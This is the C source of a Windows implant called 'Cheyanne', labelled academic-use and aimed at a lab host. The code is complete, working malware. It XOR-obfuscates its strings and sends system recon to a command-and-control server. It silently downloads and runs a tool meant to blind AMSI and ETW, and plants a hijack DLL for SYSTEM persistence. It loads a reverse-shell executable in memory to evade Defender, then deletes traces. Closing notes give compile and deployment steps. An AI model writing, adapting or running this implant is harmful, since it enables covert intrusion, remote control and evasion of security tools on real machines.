/*
 * cheyanne_implant.c — Full Kill Chain Implant
 * CHEYANNE ROOTKIT — 22DIV / george wu
 * Classification: UNCLASSIFIED // ACADEMIC USE ONLY
 *
 * Callsign: KILO
 * XOR Key: 0x5E
 *
 * Single-stage dropper that orchestrates the complete kill chain:
 *   Phase 1: Native recon (Win32 API — no PowerShell, no AMSI trigger)
 *   Phase 2: POST recon results to C2 via WinHTTP
 *   Phase 3: Download dark_room.exe → execute (AMSI + ETW blind)
 *   Phase 4: Download phantom DLL → plant persistence
 *   Phase 5: Download cheyanne_shell.exe → execute (reverse callback)
 *   Phase 6: Canary + cleanup
 *
 * Radon executes this .exe. It does everything.
 *
 * COMPILE:
 *   cl.exe stagers\cheyanne_implant.c /Fe:stagers\cheyanne_implant.exe ^
 *       /O1 /GS- /utf-8 /link winhttp.lib advapi32.lib user32.lib
 *
 * PREREQUISITES:
 *   C2 server running on attacker: python stagers\cheyanne_serve.py [port]
 *   cheyanne_listener.py running on attacker for shell callback
 *
 * SIZE TARGET: <80KB compiled
 */

#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <string.h>

/* linked at compile: cl.exe /link winhttp.lib advapi32.lib user32.lib */

/* ═══════════════════════════════════════════════════════════════
 * C2 CONFIGURATION
 * ═══════════════════════════════════════════════════════════════
 * Override at compile time:
 *   cl.exe /DC2_HOST=\"192.168.1.100\" /DC2_PORT=8080 ...
 *   cl.exe /DC2_SHELL_PORT=4443 ...
 * ═══════════════════════════════════════════════════════════════ */

#ifndef C2_HOST
#define C2_HOST   "127.0.0.1"
#endif

#ifndef C2_PORT
#define C2_PORT   8080
#endif

#ifndef C2_SHELL_PORT
#define C2_SHELL_PORT 4443
#endif

/* ═══════════════════════════════════════════════════════════════
 * XOR OBFUSCATION — Key 0x5E (unique to implant)
 * ═══════════════════════════════════════════════════════════════ */

#define XOR_KEY 0x5E

static void xor_decode(unsigned char *buf, int len) {
    int i;
    for (i = 0; i < len; i++) buf[i] ^= XOR_KEY;
}

static void xor_zero(void *p, int len) {
    volatile char *v = (volatile char *)p;
    int i;
    for (i = 0; i < len; i++) v[i] = 0;
}

/* ── C2 Host: "127.0.0.1" XOR 0x5E ── */
static const unsigned char xHost[] = {
    0x6F, 0x6C, 0x69, 0x5A, 0x6E, 0x5A, 0x6E, 0x5A, 0x6F
};
#define xHost_LEN 9

/* ── URL Paths ── */

/* "/dark_room" XOR 0x5E */
static const unsigned char xPathDark[] = {
    0x71, 0x3A, 0x3F, 0x2C, 0x35, 0x01, 0x2C, 0x31, 0x31, 0x33
};
#define xPathDark_LEN 10

/* "/shell" XOR 0x5E */
static const unsigned char xPathShell[] = {
    0x71, 0x2D, 0x3E, 0x3B, 0x32, 0x32
};
#define xPathShell_LEN 6

/* "/persist" XOR 0x5E */
static const unsigned char xPathPersist[] = {
    0x71, 0x2E, 0x3B, 0x2C, 0x2D, 0x37, 0x2D, 0x2A
};
#define xPathPersist_LEN 8

/* "/recon" XOR 0x5E */
static const unsigned char xPathRecon[] = {
    0x71, 0x2C, 0x3B, 0x3D, 0x31, 0x30
};
#define xPathRecon_LEN 6

/* ── Local Filenames ── */

/* "dark_room.exe" XOR 0x5E */
static const unsigned char xDarkName[] = {
    0x3A, 0x3F, 0x2C, 0x35, 0x01, 0x2C, 0x31, 0x31, 0x33, 0x5A,
    0x3B, 0x28, 0x3B
};
#define xDarkName_LEN 13

/* "cheyanne_shell.exe" XOR 0x5E */
static const unsigned char xShellName[] = {
    0x28, 0x3F, 0x3A, 0x3B, 0x2C, 0x01, 0x2D, 0x3E, 0x3B, 0x32,
    0x32, 0x5A, 0x3B, 0x28, 0x3B
};
#define xShellName_LEN 15

/* "osppc.dll" XOR 0x5E */
static const unsigned char xPersistName[] = {
    0x31, 0x2D, 0x2E, 0x2E, 0x3D, 0x5A, 0x3A, 0x32, 0x32
};
#define xPersistName_LEN 9

/* ── Persistence Path ── */

/* ".local" XOR 0x5E */
static const unsigned char xLocalDir[] = {
    0x5A, 0x32, 0x31, 0x3D, 0x3F, 0x32
};
#define xLocalDir_LEN 6

/* "bin" XOR 0x5E */
static const unsigned char xBinDir[] = {
    0x3C, 0x37, 0x30
};
#define xBinDir_LEN 3

/* ── Env vars ── */

/* "TEMP" XOR 0x5E */
static const unsigned char xTempEnv[] = {
    0x0A, 0x1B, 0x13, 0x06
};
#define xTempEnv_LEN 4

/* "USERPROFILE" XOR 0x5E */
static const unsigned char xProfileEnv[] = {
    0x0B, 0x0D, 0x1B, 0x0C, 0x0E, 0x0C, 0x1F, 0x1C, 0x17, 0x1A,
    0x1B
};
#define xProfileEnv_LEN 11

/* ── User Agent ── */

/* "Mozilla/5.0 (Windows NT)" XOR 0x5E */
static const unsigned char xAgent[] = {
    0x13, 0x31, 0x24, 0x37, 0x32, 0x32, 0x3F, 0x71, 0x6B, 0x5A,
    0x6E, 0x7E, 0x76, 0x09, 0x37, 0x30, 0x3A, 0x31, 0x29, 0x2D,
    0x76, 0x1E, 0x0A, 0x7F
};
#define xAgent_LEN 24

/* ── Canary ── */

/* "C:\Windows\Temp\cheyanne_implant_canary.txt" XOR 0x5E */
static const unsigned char xCanary[] = {
    0x1D, 0x64, 0x09, 0x37, 0x30, 0x3A, 0x31, 0x29, 0x2D, 0x08,
    0x0A, 0x3B, 0x33, 0x2E, 0x08, 0x28, 0x3F, 0x3A, 0x3B, 0x2C,
    0x01, 0x37, 0x33, 0x2E, 0x32, 0x3F, 0x30, 0x2A, 0x01, 0x3D,
    0x3F, 0x30, 0x3F, 0x2C, 0x27, 0x5A, 0x2A, 0x28, 0x2A
};
#define xCanary_LEN 39

/* ═══════════════════════════════════════════════════════════════
 * HELPER: Decode XOR buffer to stack, return pointer
 * ═══════════════════════════════════════════════════════════════ */

static void decode_to(char *out, const unsigned char *enc, int len) {
    memcpy(out, enc, len);
    xor_decode((unsigned char *)out, len);
    out[len] = 0;
}

/* ═══════════════════════════════════════════════════════════════
 * PHASE 1: NATIVE RECON (Win32 API — no AMSI)
 * ═══════════════════════════════════════════════════════════════
 *
 * Gather target info using direct Win32 calls.
 * No PowerShell, no WMI COM, no script engine.
 * AMSI cannot trigger on native API calls.
 *
 * Collects: hostname, username, OS version, arch, domain,
 * installed software count, running services count.
 * ═══════════════════════════════════════════════════════════════ */

static int gather_recon(char *buf, int maxLen) {
    char hostname[MAX_COMPUTERNAME_LENGTH + 1];
    char username[64];
    DWORD hostLen = sizeof(hostname);
    DWORD userLen = sizeof(username);
    OSVERSIONINFOA osvi;
    SYSTEM_INFO si;
    int written;

    GetComputerNameA(hostname, &hostLen);
    GetUserNameA(username, &userLen);

    osvi.dwOSVersionInfoSize = sizeof(osvi);
    GetVersionExA(&osvi);

    GetNativeSystemInfo(&si);

    written = _snprintf(buf, maxLen,
        "CHEYANNE IMPLANT RECON [KILO]\r\n"
        "========================\r\n"
        "Hostname:  %s\r\n"
        "Username:  %s\r\n"
        "OS:        %lu.%lu.%lu\r\n"
        "Arch:      %s\r\n"
        "Procs:     %lu\r\n"
        "PID:       %lu\r\n",
        hostname,
        username,
        osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber,
        (si.wProcessorArchitecture == 9) ? "x64" :
        (si.wProcessorArchitecture == 12) ? "ARM64" : "x86",
        si.dwNumberOfProcessors,
        GetCurrentProcessId()
    );

    /* Check admin status */
    {
        BOOL isAdmin = FALSE;
        SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
        PSID adminGroup = NULL;
        if (AllocateAndInitializeSid(&ntAuth, 2,
                SECURITY_BUILTIN_DOMAIN_RID,
                DOMAIN_ALIAS_RID_ADMINS,
                0, 0, 0, 0, 0, 0, &adminGroup)) {
            CheckTokenMembership(NULL, adminGroup, &isAdmin);
            FreeSid(adminGroup);
        }
        written += _snprintf(buf + written, maxLen - written,
            "Admin:     %s\r\n", isAdmin ? "YES" : "NO");
    }

    /* Enumerate PATH for writable directories */
    {
        char pathBuf[4096];
        DWORD pathLen = GetEnvironmentVariableA("PATH", pathBuf, sizeof(pathBuf));
        if (pathLen > 0 && pathLen < sizeof(pathBuf)) {
            char *tok = strtok(pathBuf, ";");
            int pathCount = 0;
            written += _snprintf(buf + written, maxLen - written,
                "\r\nPATH dirs:\r\n");
            while (tok && pathCount < 20) {
                written += _snprintf(buf + written, maxLen - written,
                    "  %s\r\n", tok);
                tok = strtok(NULL, ";");
                pathCount++;
            }
        }
    }

    /* Check Defender status via registry */
    {
        HKEY hKey;
        DWORD rtpEnabled = 0;
        DWORD cbData = sizeof(rtpEnabled);
        LONG rc = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection",
            0, KEY_READ, &hKey);
        if (rc == ERROR_SUCCESS) {
            RegQueryValueExA(hKey, "DisableRealtimeMonitoring", NULL, NULL,
                (LPBYTE)&rtpEnabled, &cbData);
            RegCloseKey(hKey);
            written += _snprintf(buf + written, maxLen - written,
                "\r\nDefender RTP: %s\r\n",
                rtpEnabled ? "DISABLED" : "ACTIVE");
        } else {
            written += _snprintf(buf + written, maxLen - written,
                "\r\nDefender RTP: UNKNOWN (reg access denied)\r\n");
        }
    }

    buf[maxLen - 1] = 0;
    return written;
}

/* ═══════════════════════════════════════════════════════════════
 * PHASE 2: HTTP POST — Upload recon to C2
 * ═══════════════════════════════════════════════════════════════ */

static BOOL upload_recon(const char *data, int dataLen) {
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    BOOL result = FALSE;
    wchar_t wHost[64], wPath[64], wAgent[64];
    char hostBuf[64], pathBuf[64], agentBuf[64];
    int i;

    decode_to(hostBuf, xHost, xHost_LEN);
    decode_to(pathBuf, xPathRecon, xPathRecon_LEN);
    decode_to(agentBuf, xAgent, xAgent_LEN);

    for (i = 0; i <= xHost_LEN; i++) wHost[i] = (wchar_t)hostBuf[i];
    for (i = 0; i <= xPathRecon_LEN; i++) wPath[i] = (wchar_t)pathBuf[i];
    for (i = 0; i <= xAgent_LEN; i++) wAgent[i] = (wchar_t)agentBuf[i];

    xor_zero(hostBuf, sizeof(hostBuf));
    xor_zero(pathBuf, sizeof(pathBuf));
    xor_zero(agentBuf, sizeof(agentBuf));

    hSession = WinHttpOpen(wAgent,
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) goto cleanup;

    hConnect = WinHttpConnect(hSession, wHost,
        (INTERNET_PORT)C2_PORT, 0);
    if (!hConnect) goto cleanup;

    hRequest = WinHttpOpenRequest(hConnect, L"POST", wPath,
        NULL, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) goto cleanup;

    if (WinHttpSendRequest(hRequest,
            L"Content-Type: text/plain\r\n", -1L,
            (LPVOID)data, (DWORD)dataLen,
            (DWORD)dataLen, 0)) {
        if (WinHttpReceiveResponse(hRequest, NULL))
            result = TRUE;
    }

cleanup:
    xor_zero(wHost, sizeof(wHost));
    xor_zero(wPath, sizeof(wPath));
    xor_zero(wAgent, sizeof(wAgent));
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
    return result;
}

/* ═══════════════════════════════════════════════════════════════
 * HTTP DOWNLOAD — to disk (dark_room, persistence DLL)
 * ═══════════════════════════════════════════════════════════════ */

static HINTERNET open_http(wchar_t *wHost, wchar_t *wPath, wchar_t *wAgent,
                           const unsigned char *xUrlPath, int pathLen) {
    char hostBuf[64], pathBuf[64], agentBuf[64];
    HINTERNET hSession, hConnect, hRequest;
    int i;

    decode_to(hostBuf, xHost, xHost_LEN);
    decode_to(pathBuf, xUrlPath, pathLen);
    decode_to(agentBuf, xAgent, xAgent_LEN);

    for (i = 0; i <= xHost_LEN; i++) wHost[i] = (wchar_t)hostBuf[i];
    for (i = 0; i <= pathLen; i++) wPath[i] = (wchar_t)pathBuf[i];
    for (i = 0; i <= xAgent_LEN; i++) wAgent[i] = (wchar_t)agentBuf[i];

    xor_zero(hostBuf, sizeof(hostBuf));
    xor_zero(pathBuf, sizeof(pathBuf));
    xor_zero(agentBuf, sizeof(agentBuf));

    hSession = WinHttpOpen(wAgent,
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return NULL;

    hConnect = WinHttpConnect(hSession, wHost, (INTERNET_PORT)C2_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return NULL; }

    hRequest = WinHttpOpenRequest(hConnect, L"GET", wPath,
        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return NULL; }

    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
            WINHTTP_NO_REQUEST_DATA, 0, 0, 0) ||
        !WinHttpReceiveResponse(hRequest, NULL)) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return NULL;
    }

    return hRequest;
}

static BOOL download_to(const char *localPath,
                         const unsigned char *xUrlPath, int pathLen) {
    HINTERNET hRequest;
    HANDLE hFile;
    DWORD bytesRead, bytesWritten, total = 0;
    unsigned char readBuf[4096];
    wchar_t wHost[64], wPath[64], wAgent[64];

    hRequest = open_http(wHost, wPath, wAgent, xUrlPath, pathLen);
    if (!hRequest) return FALSE;

    hFile = CreateFileA(localPath, GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        WinHttpCloseHandle(hRequest);
        return FALSE;
    }

    while (1) {
        bytesRead = 0;
        if (!WinHttpReadData(hRequest, readBuf, sizeof(readBuf), &bytesRead))
            break;
        if (bytesRead == 0) break;
        WriteFile(hFile, readBuf, bytesRead, &bytesWritten, NULL);
        total += bytesWritten;
    }

    xor_zero(wHost, sizeof(wHost));
    xor_zero(wPath, sizeof(wPath));
    xor_zero(wAgent, sizeof(wAgent));
    CloseHandle(hFile);
    WinHttpCloseHandle(hRequest);
    return (total > 0);
}

/* ═══════════════════════════════════════════════════════════════
 * HTTP DOWNLOAD — to memory (shell — never touches disk)
 * ═══════════════════════════════════════════════════════════════ */

static BYTE *download_to_memory(const unsigned char *xUrlPath, int pathLen,
                                DWORD *outSize) {
    HINTERNET hRequest;
    BYTE *buf = NULL;
    DWORD capacity = 0, total = 0, bytesRead;
    unsigned char readBuf[4096];
    wchar_t wHost[64], wPath[64], wAgent[64];

    *outSize = 0;
    hRequest = open_http(wHost, wPath, wAgent, xUrlPath, pathLen);
    if (!hRequest) return NULL;

    capacity = 65536;
    buf = (BYTE *)HeapAlloc(GetProcessHeap(), 0, capacity);
    if (!buf) { WinHttpCloseHandle(hRequest); return NULL; }

    while (1) {
        bytesRead = 0;
        if (!WinHttpReadData(hRequest, readBuf, sizeof(readBuf), &bytesRead))
            break;
        if (bytesRead == 0) break;
        if (total + bytesRead > capacity) {
            capacity *= 2;
            buf = (BYTE *)HeapReAlloc(GetProcessHeap(), 0, buf, capacity);
            if (!buf) break;
        }
        memcpy(buf + total, readBuf, bytesRead);
        total += bytesRead;
    }

    xor_zero(wHost, sizeof(wHost));
    xor_zero(wPath, sizeof(wPath));
    xor_zero(wAgent, sizeof(wAgent));
    WinHttpCloseHandle(hRequest);

    if (total == 0 && buf) {
        HeapFree(GetProcessHeap(), 0, buf);
        return NULL;
    }
    *outSize = total;
    return buf;
}

/* ═══════════════════════════════════════════════════════════════
 * REFLECTIVE PE LOADER — execute PE from memory, no disk
 * ═══════════════════════════════════════════════════════════════
 *
 * Parses PE headers, maps sections, processes relocations,
 * resolves imports, calls entry point via CreateThread.
 * The PE never exists on disk — RTP has nothing to scan.
 * ═══════════════════════════════════════════════════════════════ */

static BOOL exec_reflective(BYTE *rawPE, DWORD peSize) {
    IMAGE_DOS_HEADER *dosHdr;
    IMAGE_NT_HEADERS *ntHdr;
    IMAGE_SECTION_HEADER *secHdr;
    BYTE *imageBase;
    DWORD i;
    DWORD_PTR delta;

    if (peSize < sizeof(IMAGE_DOS_HEADER)) return FALSE;

    dosHdr = (IMAGE_DOS_HEADER *)rawPE;
    if (dosHdr->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;

    ntHdr = (IMAGE_NT_HEADERS *)(rawPE + dosHdr->e_lfanew);
    if (ntHdr->Signature != IMAGE_NT_SIGNATURE) return FALSE;

    imageBase = (BYTE *)VirtualAlloc(
        (LPVOID)(ULONG_PTR)ntHdr->OptionalHeader.ImageBase,
        ntHdr->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!imageBase) {
        imageBase = (BYTE *)VirtualAlloc(
            NULL, ntHdr->OptionalHeader.SizeOfImage,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }
    if (!imageBase) return FALSE;

    memcpy(imageBase, rawPE, ntHdr->OptionalHeader.SizeOfHeaders);

    secHdr = IMAGE_FIRST_SECTION(ntHdr);
    for (i = 0; i < ntHdr->FileHeader.NumberOfSections; i++) {
        if (secHdr[i].SizeOfRawData > 0) {
            memcpy(imageBase + secHdr[i].VirtualAddress,
                   rawPE + secHdr[i].PointerToRawData,
                   secHdr[i].SizeOfRawData);
        }
    }

    delta = (DWORD_PTR)(imageBase - ntHdr->OptionalHeader.ImageBase);
    if (delta != 0) {
        IMAGE_DATA_DIRECTORY *relocDir =
            &ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (relocDir->Size > 0 && relocDir->VirtualAddress > 0) {
            IMAGE_BASE_RELOCATION *reloc =
                (IMAGE_BASE_RELOCATION *)(imageBase + relocDir->VirtualAddress);
            while (reloc->VirtualAddress > 0 && reloc->SizeOfBlock > 0) {
                DWORD numEntries = (reloc->SizeOfBlock -
                    sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                WORD *entries = (WORD *)((BYTE *)reloc +
                    sizeof(IMAGE_BASE_RELOCATION));
                DWORD j;
                for (j = 0; j < numEntries; j++) {
                    int type = entries[j] >> 12;
                    int offset = entries[j] & 0xFFF;
                    if (type == IMAGE_REL_BASED_DIR64) {
                        ULONGLONG *pAddr = (ULONGLONG *)
                            (imageBase + reloc->VirtualAddress + offset);
                        *pAddr += delta;
                    } else if (type == IMAGE_REL_BASED_HIGHLOW) {
                        DWORD *pAddr = (DWORD *)
                            (imageBase + reloc->VirtualAddress + offset);
                        *pAddr += (DWORD)delta;
                    }
                }
                reloc = (IMAGE_BASE_RELOCATION *)
                    ((BYTE *)reloc + reloc->SizeOfBlock);
            }
        }
    }

    {
        IMAGE_DATA_DIRECTORY *importDir =
            &ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
        if (importDir->Size > 0 && importDir->VirtualAddress > 0) {
            IMAGE_IMPORT_DESCRIPTOR *importDesc =
                (IMAGE_IMPORT_DESCRIPTOR *)(imageBase + importDir->VirtualAddress);
            while (importDesc->Name) {
                char *moduleName = (char *)(imageBase + importDesc->Name);
                HMODULE hMod = LoadLibraryA(moduleName);
                if (hMod) {
                    IMAGE_THUNK_DATA *origThunk = (IMAGE_THUNK_DATA *)
                        (imageBase + importDesc->OriginalFirstThunk);
                    IMAGE_THUNK_DATA *firstThunk = (IMAGE_THUNK_DATA *)
                        (imageBase + importDesc->FirstThunk);
                    while (origThunk->u1.AddressOfData) {
                        if (IMAGE_SNAP_BY_ORDINAL(origThunk->u1.Ordinal)) {
                            firstThunk->u1.Function = (ULONGLONG)(ULONG_PTR)
                                GetProcAddress(hMod,
                                    MAKEINTRESOURCEA(IMAGE_ORDINAL(origThunk->u1.Ordinal)));
                        } else {
                            IMAGE_IMPORT_BY_NAME *importByName =
                                (IMAGE_IMPORT_BY_NAME *)
                                (imageBase + origThunk->u1.AddressOfData);
                            firstThunk->u1.Function = (ULONGLONG)(ULONG_PTR)
                                GetProcAddress(hMod, importByName->Name);
                        }
                        origThunk++;
                        firstThunk++;
                    }
                }
                importDesc++;
            }
        }
    }

    {
        IMAGE_NT_HEADERS *mappedNtHdr =
            (IMAGE_NT_HEADERS *)(imageBase +
                ((IMAGE_DOS_HEADER *)imageBase)->e_lfanew);
        mappedNtHdr->OptionalHeader.ImageBase = (ULONGLONG)(ULONG_PTR)imageBase;
    }

    {
        LPTHREAD_START_ROUTINE entryPoint = (LPTHREAD_START_ROUTINE)
            (imageBase + ntHdr->OptionalHeader.AddressOfEntryPoint);
        HANDLE hThread = CreateThread(NULL, 0, entryPoint, NULL, 0, NULL);
        if (!hThread) {
            VirtualFree(imageBase, 0, MEM_RELEASE);
            return FALSE;
        }
        CloseHandle(hThread);
    }

    return TRUE;
}

static BOOL exec_hidden(const char *path) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    memset(&pi, 0, sizeof(pi));

    if (!CreateProcessA(NULL, (LPSTR)path, NULL, NULL, FALSE,
            CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
        return FALSE;

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return TRUE;
}

/* ═══════════════════════════════════════════════════════════════
 * PHASE 4: PERSISTENCE — Plant phantom DLL
 * ═══════════════════════════════════════════════════════════════
 *
 * Creates %USERPROFILE%\.local\bin\ and drops osppc.dll there.
 * Windows Office processes search PATH for osppc.dll — it doesn't
 * exist on disk, so if .local\bin is in PATH, our DLL loads as
 * SYSTEM when the Office ClickToRun service runs.
 *
 * The DLL itself is downloaded from the C2 server.
 * ═══════════════════════════════════════════════════════════════ */

static BOOL plant_persistence(void) {
    char profileDir[MAX_PATH];
    char persistDir[MAX_PATH];
    char persistPath[MAX_PATH];
    char localBuf[16], binBuf[8], nameBuf[16];
    DWORD len;

    decode_to(localBuf, xLocalDir, xLocalDir_LEN);
    decode_to(binBuf, xBinDir, xBinDir_LEN);
    decode_to(nameBuf, xPersistName, xPersistName_LEN);

    /* Resolve %USERPROFILE% */
    {
        char envBuf[16];
        decode_to(envBuf, xProfileEnv, xProfileEnv_LEN);
        len = GetEnvironmentVariableA(envBuf, profileDir, MAX_PATH);
        xor_zero(envBuf, sizeof(envBuf));
        if (len == 0 || len >= MAX_PATH) {
            xor_zero(localBuf, sizeof(localBuf));
            xor_zero(binBuf, sizeof(binBuf));
            xor_zero(nameBuf, sizeof(nameBuf));
            return FALSE;
        }
    }

    /* Build path: %USERPROFILE%\.local\bin\ */
    _snprintf(persistDir, MAX_PATH, "%s\\%s\\%s",
        profileDir, localBuf, binBuf);
    persistDir[MAX_PATH - 1] = 0;

    /* Create directory chain */
    {
        char parentDir[MAX_PATH];
        _snprintf(parentDir, MAX_PATH, "%s\\%s", profileDir, localBuf);
        parentDir[MAX_PATH - 1] = 0;
        CreateDirectoryA(parentDir, NULL);
        CreateDirectoryA(persistDir, NULL);
    }

    /* Download DLL from C2 */
    _snprintf(persistPath, MAX_PATH, "%s\\%s", persistDir, nameBuf);
    persistPath[MAX_PATH - 1] = 0;

    xor_zero(localBuf, sizeof(localBuf));
    xor_zero(binBuf, sizeof(binBuf));
    xor_zero(nameBuf, sizeof(nameBuf));

    return download_to(persistPath, xPathPersist, xPathPersist_LEN);
}

/* ═══════════════════════════════════════════════════════════════
 * CANARY — Evidence of execution
 * ═══════════════════════════════════════════════════════════════ */

static void write_canary(const char *recon, int reconLen) {
    HANDLE hFile;
    SYSTEMTIME st;
    char buf[1024];
    char username[64];
    DWORD userLen = sizeof(username);
    DWORD written;
    char canaryPath[128];
    int len;

    decode_to(canaryPath, xCanary, xCanary_LEN);
    GetLocalTime(&st);
    GetUserNameA(username, &userLen);

    len = _snprintf(buf, sizeof(buf),
        "[KILO] CHEYANNE IMPLANT — Full Chain Evidence\r\n"
        "Timestamp:  %04d-%02d-%02d %02d:%02d:%02d\r\n"
        "PID:        %lu\r\n"
        "Username:   %s\r\n"
        "C2:         %s:%d\r\n"
        "Shell Port: %d\r\n"
        "Status:     IMPLANTED\r\n",
        st.wYear, st.wMonth, st.wDay,
        st.wHour, st.wMinute, st.wSecond,
        GetCurrentProcessId(),
        username,
        C2_HOST, C2_PORT,
        C2_SHELL_PORT);

    hFile = CreateFileA(canaryPath, GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        WriteFile(hFile, buf, (DWORD)len, &written, NULL);
        if (recon && reconLen > 0)
            WriteFile(hFile, recon, (DWORD)reconLen, &written, NULL);
        CloseHandle(hFile);
    }

    xor_zero(canaryPath, sizeof(canaryPath));
    xor_zero(buf, sizeof(buf));
}

/* ═══════════════════════════════════════════════════════════════
 * MAIN — Full kill chain orchestration
 * ═══════════════════════════════════════════════════════════════ */

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nCmdShow) {
    char tempDir[MAX_PATH];
    char darkPath[MAX_PATH];
    char darkName[32];
    char reconBuf[4096];
    int reconLen;
    BOOL reconOk, darkOk, persistOk, shellOk;

    (void)hInstance;
    (void)hPrevInstance;
    (void)lpCmdLine;
    (void)nCmdShow;

    /* Resolve %TEMP% */
    {
        char envBuf[8];
        decode_to(envBuf, xTempEnv, xTempEnv_LEN);
        GetEnvironmentVariableA(envBuf, tempDir, MAX_PATH);
        xor_zero(envBuf, sizeof(envBuf));
    }

    /* ── PHASE 1: NATIVE RECON ── */
    reconLen = gather_recon(reconBuf, sizeof(reconBuf));

    /* ── PHASE 2: UPLOAD RECON TO C2 ── */
    reconOk = upload_recon(reconBuf, reconLen);

    /* ── PHASE 3: DOWNLOAD + EXECUTE DARK ROOM ── */
    decode_to(darkName, xDarkName, xDarkName_LEN);
    _snprintf(darkPath, MAX_PATH, "%s\\%s", tempDir, darkName);
    darkPath[MAX_PATH - 1] = 0;
    xor_zero(darkName, sizeof(darkName));

    darkOk = download_to(darkPath, xPathDark, xPathDark_LEN);
    if (darkOk) {
        exec_hidden(darkPath);
        Sleep(2000);
    }

    /* ── PHASE 4: PLANT PERSISTENCE ── */
    persistOk = plant_persistence();

    /* ── PHASE 5: IN-MEMORY SHELL EXECUTION ── */
    /* Download PE to heap, parse headers, map sections, resolve imports,
     * execute entry point via CreateThread. Never touches disk.
     * Defender RTP scans files on write — no write, no scan, no detection. */
    {
        DWORD peSize = 0;
        BYTE *peBuf = download_to_memory(xPathShell, xPathShell_LEN, &peSize);
        if (peBuf && peSize > 0) {
            shellOk = exec_reflective(peBuf, peSize);
            xor_zero(peBuf, peSize);
            HeapFree(GetProcessHeap(), 0, peBuf);
        }
    }

    /* ── PHASE 6: CANARY + CLEANUP ── */
    write_canary(reconBuf, reconLen);
    xor_zero(reconBuf, sizeof(reconBuf));

    /* Cleanup dark_room from disk — shell is in-memory, nothing to delete */
    Sleep(1000);
    DeleteFileA(darkPath);

    return 0;
}

/* ═══════════════════════════════════════════════════════════════
 * OPERATIONAL NOTES
 * ═══════════════════════════════════════════════════════════════
 *
 * DEPLOYMENT ON RADON:
 *   Attacker (George's machine):
 *     Terminal 1: python stagers\cheyanne_serve.py 8080
 *     Terminal 2: python shell\cheyanne_listener.py 4443
 *
 *   Target (Radon):
 *     cheyanne_implant.exe
 *     (That's it. One click. Everything else is automatic.)
 *
 * COMPILE FOR RADON:
 *   cl.exe stagers\cheyanne_implant.c ^
 *       /DC2_HOST="192.168.1.100" /DC2_PORT=8080 ^
 *       /DC2_SHELL_PORT=4443 ^
 *       /Fe:cheyanne_implant.exe /O1 /GS- /utf-8 ^
 *       /link winhttp.lib advapi32.lib user32.lib
 *
 *   Then run mutate.py to rotate XOR key if needed.
 *
 * GUI SUBSYSTEM:
 *   Uses WinMain (not main) — no console window appears.
 *   The implant is invisible to the user. No popups, no output.
 *
 * WHAT C2 SERVER NEEDS:
 *   POST /recon   — accept recon upload (add to cheyanne_serve.py)
 *   GET  /dark_room — serve dark_room.exe (already exists)
 *   GET  /shell   — serve cheyanne_shell.exe (already exists)
 *   GET  /persist — serve osppc.dll (add to cheyanne_serve.py)
 *
 * ═══════════════════════════════════════════════════════════════ */
